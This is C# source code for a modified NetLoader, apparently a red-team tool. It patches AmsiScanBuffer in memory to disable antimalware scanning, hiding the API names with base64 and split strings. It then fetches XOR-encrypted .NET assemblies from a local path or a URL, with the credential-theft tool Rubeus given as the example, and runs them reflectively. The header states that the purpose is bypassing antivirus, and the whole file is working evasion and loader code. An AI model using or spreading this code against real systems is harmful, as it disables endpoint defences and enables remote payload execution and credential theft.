/*
Author: Arno0x0x, Twitter: @Arno0x0x
Completely based on @Flangvik netloader

This partial rewrite of @Flangvik Netloader includes the following changes:

	- Allow loading of an XOR encrypted binary to bypass antiviruses
		To encrypt the initial binary you can use my Python transformFile.py script.
		Example: ./transformFile.py -e xor -k mightyduck -i Rubeus.bin -o Rubeus.xor
		
		Source: https://gist.github.com/Arno0x/1ec189d6bee3e92fdef1d72a72899b1d
		
	- Different parsing of arguments which allows passing multiple arguments to the loaded binary

	- Support of web proxy with authentication if ever required
	
	- Removed access to hardcoded URL on GitHub (not secure practice !)

===================================== COMPILING =====================================
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:NetLoader.exe NetLoader.cs

*/

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;

public class TotallyNotNt
{
	[DllImport("ke" + "rne" + "l32")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("ke" + "rne" + "l32")]
	private static extern IntPtr LoadLibrary(string name);

	[DllImport("ke" + "rne" + "l32")]
	private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	static WebClient leaveMeAlone = new WebClient();

	//---------------------------------------------------------------------------------------
	//
	//---------------------------------------------------------------------------------------
	private static void RiddleMeThis(MethodInfo methodHolder, object[] dataArgs = null)
	{
		methodHolder.Invoke(0, dataArgs);
	}

	//---------------------------------------------------------------------------------------
	// XOR decrypt a byte array using a given key
	//---------------------------------------------------------------------------------------
	private static byte[] mixThis(byte[] input, byte[] theKey)
	{
		byte[] mixed = new byte[input.Length];
		for (int i = 0; i < input.Length; i++)
		{
			mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
		}
		return mixed;
	}

	//---------------------------------------------------------------------------------------
	// Prints usage
	//---------------------------------------------------------------------------------------
	private static void PrintUsage()
	{
		Console.WriteLine("Usage: ");
		Console.WriteLine("Usage: {0} [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>]", System.AppDomain.CurrentDomain.FriendlyName);
		Console.WriteLine("\t-b64: Optionnal flag parameter indicating that all other parameters are base64 encoded.");
		Console.WriteLine("\t-xor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
		Console.WriteLine("\t-path: Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
		Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");
	}

	//=======================================================================================
	// MAIN
	//=======================================================================================
	public static void Main(string[] args)
	{
		Console.WriteLine("[!] ~Flangvik - Arno0x0x Edition - #NetLoader");

		//-----------------------------------------------
		// Ensure we have some arguments
		if (args.Length == 0)
		{
			PrintUsage();
			Environment.Exit(0);
		}

		//-----------------------------------------------
		// If there's a system proxy used to download the binary
		IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
		if (defaultProxy != null)
		{
			defaultProxy.Credentials = CredentialCache.DefaultCredentials;
			leaveMeAlone.Proxy = defaultProxy;
		}

		//-----------------------------------------------
		// Patch AMSI.DLL
		MoveLifeAhead();

		while (true)
		{
			try
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

				string payloadPath = "";
				string[] payloadArgs = { };
				string micKey = "";
				bool base64Decode = false;
				bool micKeyEncoded = false;

				foreach (string argument in args)
				{
					//----------------------------------------
					// Flag parameter used to indicate that all other parameters are base64 encoded
					if (argument.ToLower() == "-b64")
					{
						base64Decode = true;
						Console.WriteLine("[+] All arguments are Base64 encoded, decoding them on the fly");
					}

					//----------------------------------------
					// Flag parameter used to indicate that the binary is XOR encrypted
					if (argument.ToLower() == "-xor")
					{
						micKeyEncoded = true;

						int argData = Array.IndexOf(args, argument) + 1;
						if (argData < args.Length)
						{
							string rawArg = args[argData];
							if (base64Decode)
								micKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
							else
								micKey = rawArg;
						}

						Console.WriteLine("[+] Decrypting XOR encrypted binary using key '{0}'", micKey);
					}

					//----------------------------------------
					// The binary file path is set after this parameter
					if (argument.ToLower() == "-path")
					{
						int argData = Array.IndexOf(args, argument) + 1;
						if (argData < args.Length)
						{
							string rawPayload = args[argData];
							if (base64Decode)
								payloadPath = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
							else
								payloadPath = rawPayload;
						}
					}

					//----------------------------------------
					// The binary arguments, if any, are set after this parameter
					if (argument.ToLower() == "-args")
					{
						int binaryArgsIndex = Array.IndexOf(args, argument) + 1;
						int nbBinaryArgs = args.Length - binaryArgsIndex;

						payloadArgs = new String[nbBinaryArgs];

						// All arguments until the end are to be passed to the binary
						for (int i = 0; i < nbBinaryArgs; i++)
						{
							string rawPayloadArgs = args[binaryArgsIndex + i];

							if (base64Decode)
								payloadArgs[i] = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
							else
								payloadArgs[i] = rawPayloadArgs;
						}
					}
				}

				//----------------------------------------------------------------
				// We're done parsing all arguments, check we at least have a path
				if (string.IsNullOrEmpty(payloadPath))
				{
					PrintUsage();
					Environment.Exit(0);
				}

				//----------------------------------------------------------------
				// Load and start the binary with its arguments (if any)
				Console.WriteLine("[+] Starting {0} with args '{1}'", payloadPath, string.Join(" ", payloadArgs));
				leaveThisAlone(payloadPath, payloadArgs, micKeyEncoded, micKey);
				Environment.Exit(0);
			}
			catch (Exception ex)
			{
				Console.WriteLine("[!] Damn, it failed, too bad");
				Console.WriteLine("[!] {0}", ex.Message);
				Environment.Exit(0);
			}
		}
	}

	//---------------------------------------------------------------------------------------
	// Returns the entry point of the assembly passed as argument
	//---------------------------------------------------------------------------------------
	private static MethodInfo testMe(Assembly asm)
	{
		if (1 == 1)
			return asm.EntryPoint;

		return null;
	}

	//---------------------------------------------------------------------------------------
	//
	//---------------------------------------------------------------------------------------
	private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
	{
		Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
	}

	//---------------------------------------------------------------------------------------
	// Loads the AMSI.DLL library into memory and then patches it to actually
	// disable it.
	//---------------------------------------------------------------------------------------
	private static void MoveLifeAhead(bool BigBoy = false)
	{
		try
		{
			var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
			IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
			uint magicRastaValue = 0x40;
			uint someNumber = 0;

			if (System.Environment.Is64BitOperatingSystem)
			{
				var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

				VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);
				CopyData(bigBoyBytes, addr);
			}
			else
			{
				var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

				VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
				CopyData(smallBoyBytes, addr);

			}
			Console.WriteLine("[+] Patched!");
		}
		catch (Exception ex)
		{
			Console.WriteLine("[!] {0}", ex.Message);
		}
	}

	//---------------------------------------------------------------------------------------
	// This function actually calls the binary assembly entry point with its arguments
	//---------------------------------------------------------------------------------------
	public static void leaveThisAlone(string customUrl, string[] arguments, bool micKeyEncoded = false, string micKey = "")
	{
		object[] argHolder = new object[] { arguments };
		byte[] micKeyBytes = Encoding.ASCII.GetBytes(micKey);


		if (!customUrl.StartsWith("http"))
		{
			if (micKeyEncoded)
			{
				RiddleMeThis(testMe(Assembly.Load(mixThis(File.ReadAllBytes(customUrl), micKeyBytes))), argHolder);
			}
			else
			{
				RiddleMeThis(testMe(Assembly.Load(File.ReadAllBytes(customUrl))), argHolder);
			}
		}
		else
		{
			if (micKeyEncoded)
			{
				RiddleMeThis(testMe(Assembly.Load(mixThis(leaveMeAlone.DownloadData(customUrl), micKeyBytes))), argHolder);
			}
			else
			{
				RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl))), argHolder);
			}
		}
	}
}
